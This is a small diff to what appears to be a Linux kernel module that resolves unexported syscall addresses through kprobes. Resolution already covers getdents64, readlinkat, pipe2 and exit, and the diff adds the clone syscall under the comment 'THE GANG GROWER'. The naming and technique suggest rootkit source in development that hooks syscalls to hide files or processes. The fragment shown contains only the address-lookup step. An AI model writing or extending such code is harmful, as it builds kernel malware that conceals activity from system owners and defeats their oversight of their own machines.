@@ -65,6 +65,7 @@ mattx_sys_readlinkat_fn real_sys_readlinkat = NULL;
 mattx_sys_getdents64_fn real_sys_getdents64 = NULL;
 mattx_sys_pipe2_fn real_sys_pipe2 = NULL;
 mattx_sys_exit_fn real_sys_exit = NULL;
+mattx_sys_clone_fn real_sys_clone = NULL;
 
 
 static void mattx_resolve_hidden_symbols(void) {
@@ -310,6 +311,15 @@ static void mattx_resolve_hidden_symbols(void) {
         real_sys_exit = (mattx_sys_exit_fn)kp.addr; 
         unregister_kprobe(&kp); 
     }
+
+    // --- THE GANG GROWER ---
+    memset(&kp, 0, sizeof(kp)); 
+    kp.symbol_name = "__x64_sys_clone";
+    if (register_kprobe(&kp) == 0) { 
+        real_sys_clone = (mattx_sys_clone_fn)kp.addr; 
+        unregister_kprobe(&kp); 
+    }
+
 
 }
 
